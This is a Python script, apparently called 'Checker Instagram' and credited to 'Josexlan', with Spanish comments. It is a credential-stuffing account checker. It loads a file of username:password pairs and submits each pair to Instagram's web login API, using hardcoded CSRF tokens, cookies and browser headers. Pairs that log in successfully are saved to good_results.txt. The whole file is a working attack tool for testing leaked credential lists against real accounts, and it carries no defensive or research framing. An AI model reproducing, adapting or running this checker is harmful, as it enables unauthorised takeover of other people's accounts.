import requests
import os
import platform
from tkinter import Tk
from tkinter.filedialog import askopenfilename

# Función para limpiar la consola
def clear_console():
    if platform.system() == "Windows":
        os.system("cls")  # Comando para limpiar consola en Windows
    else:
        os.system("clear")  # Comando para limpiar consola en macOS/Linux

# ASCII art para el título
def show_menu():
    print(r"""
    ____ _   _ _____ ____ _  _______ ____    ___ _   _ ____ _____  _    ____ ____      _    __  __ 
  / ___| | | | ____/ ___| |/ / ____|  _ \  |_ _| \ | / ___|_   _|/ \  / ___|  _ \    / \  |  \/  |
 | |   | |_| |  _|| |   | ' /|  _| | |_) |  | ||  \| \___ \ | | / _ \| |  _| |_) |  / _ \ | |\/| |
 | |___|  _  | |__| |___| . \| |___|  _ <   | || |\  |___) || |/ ___ \ |_| |  _ <  / ___ \| |  | |
  \____|_| |_|_____\____|_|\_\_____|_| \_\ |___|_| \_|____/ |_/_/   \_\____|_| \_\/_/   \_\_|  |_| 
                                                                                                
                        By: Josexlan                                                              
                                                                                                
            1. Cargar archivo (usuario:contraseña)
            2. Ingresar usuario y contraseña manualmente
            3. Salir
    """)

# Función para iniciar sesión en Instagram
def login_instagram(username, password):
    try:
        url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
        data = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:0:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false"
        }

        cookies = {
            "csrftoken": "kagyeO1QbMSlVIBExJRCrpU2BB42SblM",
            "mid": "ZwQ36AALAAE-BcWh9LFyT6dQShRT"
        }

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-CSRFToken": "kagyeO1QbMSlVIBExJRCrpU2BB42SblM",
            "X-Instagram-AJAX": "1018418213",
            "X-IG-App-ID": "936619743392459",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        }

        response = requests.post(url, data=data, headers=headers, cookies=cookies)
        
        if response.status_code == 200:
            response_json = response.json()
            if response_json.get("authenticated"):
                return True, response_json  # Devuelve True si autenticado
            else:
                return False, response_json  # Devuelve False si no autenticado
        else:
            return None, response.text  # Error en la solicitud
    except Exception as e:
        return None, f"Error: {str(e)}"

# Función para procesar archivo cargado
def process_file(filepath):
    # Crear un archivo para guardar resultados buenos
    with open("good_results.txt", 'w', encoding='utf-8') as good_file:
        try:
            with open(filepath, 'r', encoding='utf-8') as file:
                lines = file.readlines()
                for line in lines:
                    if ':' in line:
                        username, password = line.strip().split(':', maxsplit=1)
                        print(f"Probando \033[93m{username}:{password}\033[0m...")  # Amarillo
                        success, response = login_instagram(username, password)
                        if success:
                            print(f"\033[92m[+] Login exitoso: {username}\033[0m")  # Verde
                            good_file.write(f"{username}:{password}\n")  # Guardar en tiempo real
                        else:
                            print(f"\033[91m[-] Login fallido: {username}\033[0m")  # Rojo vivo
        except Exception as e:
            print(f"\033[91mError procesando archivo: {e}\033[0m")  # Rojo vivo

# Función para cargar archivo
def load_file():
    try:
        Tk().withdraw()  # Ocultar la ventana principal de Tkinter
        filepath = askopenfilename(filetypes=[("Archivos de texto", "*.txt")])
        if filepath:
            print(f"Archivo seleccionado: {filepath}")
            process_file(filepath)
        else:
            print("\033[91mNo se seleccionó ningún archivo.\033[0m")  # Rojo vivo
    except Exception as e:
        print(f"\033[91mError al cargar archivo: {e}\033[0m")  # Rojo vivo

# Función principal
def main():
    while True:
        clear_console()
        show_menu()
        choice = input("Seleccione una opción: ").strip()
        try:
            if choice == '1':
                print("Cargando archivo...")
                load_file()
            elif choice == '2':
                username = input("Ingrese el nombre de usuario: ").strip()
                password = input("Ingrese la contraseña: ").strip()
                success, response = login_instagram(username, password)
                if success:
                    print(f"\033[92m[+] Login exitoso: {username}\033[0m")  # Verde
                else:
                    print(f"\033[91m[-] Login fallido: {username}\033[0m")  # Rojo vivo
                print(f"Respuesta del servidor: {response}")
                input("\nPresione ENTER para continuar...")  # Pausa antes de limpiar la consola
            elif choice == '3':
                print("Saliendo...")
                break
            else:
                print("\033[91mOpción inválida. Intente nuevamente.\033[0m")  # Rojo vivo
                input("\nPresione ENTER para continuar...")
        except Exception as e:
            print(f"\033[91mOcurrió un error: {e}\033[0m")  # Rojo vivo
            input("\nPresione ENTER para continuar...")

if __name__ == "__main__":
    main()
